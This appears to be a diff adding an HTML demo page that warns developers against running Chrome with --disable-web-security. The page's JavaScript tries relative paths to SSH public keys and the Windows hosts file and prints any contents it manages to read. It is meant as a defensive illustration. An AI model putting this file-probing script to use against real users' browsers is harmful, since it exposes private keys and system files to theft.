@@ -1,0 +1,77 @@
+<style>
+pre { margin: 0; }
+</style>
+<body>
+<h1>One example of why <code>--disable-web-securty</code> is a bad idea</h1>
+<p>
+Imagine this is some webpage you want to reference offline.
+</p>
+<p>Right click and pick "Save As.." and save it locally. Now run chrome with <code>--disable-web-security</code> and
+then double click the file. You'll likely see it is able to read local files from your hard drive. It could just
+as easily transmit those files to a remote server.
+</p>
+<p>
+You may say you never save HTML files locally. That's not the point. The point is you disabled security. Here's one example
+to show there are issues. There are likely more issues. The point is not to enumerate every possible issue. The point is why take the risk? Instead of using <code>--disable-web-security</code>
+<a href="https://stackoverflow.com/questions/12905426/what-is-a-faster-alternative-to-pythons-http-server-or-simplehttpserver">run a simple server for your dev</a>.
+</p>
+</body>
+<script>
+const getFQUrl = (function() {
+  const a = document.createElement("a");
+  return function getFQUrl(url) {
+    a.href = url;
+    return a.href;
+  };
+}());
+
+const files = [
+  "../.ssh/id_rsa.pub",
+  "../../.ssh/id_rsa.pub",
+  "../../../.ssh/id_rsa.pub",
+  "../../../../.ssh/id_rsa.pub",
+  "../../../../../.ssh/id_rsa.pub",
+  "../../../../../../.ssh/id_rsa.pub",
+  "file:///C:/Windows/system32/drivers/etc/hosts",
+];
+
+let numFound = 0;
+window.foo = [];
+function tryNextFile() {
+  if (files.length) {
+    const url = files.shift();
+    console.log("try:", url);
+    getHTML(url, (error, data) => {
+      if (!error) {
+        log(url, ":", data);
+      }
+      tryNextFile();
+    });
+  }
+};
+tryNextFile();
+
+function log(...args) {
+  const elem = document.createElement("pre");
+  elem.textContent = [...args].join(' ');
+  document.body.appendChild(elem);
+}
+
+function getHTML(url, callback) {
+  var req = new XMLHttpRequest();
+  req.open("GET", url, true);
+  req.addEventListener('load', function() {
+    var success = req.status == 200 || req.status == 0;
+    callback(success ? null : 'could not load: ' + url, req.responseText);
+  });
+  req.addEventListener('timeout', function() {
+    callback("timeout get: " + url);
+  });
+  req.addEventListener('error', function() {
+    callback("error getting: " + url);
+  });
+  req.send("");
+}
+
+
+</script>
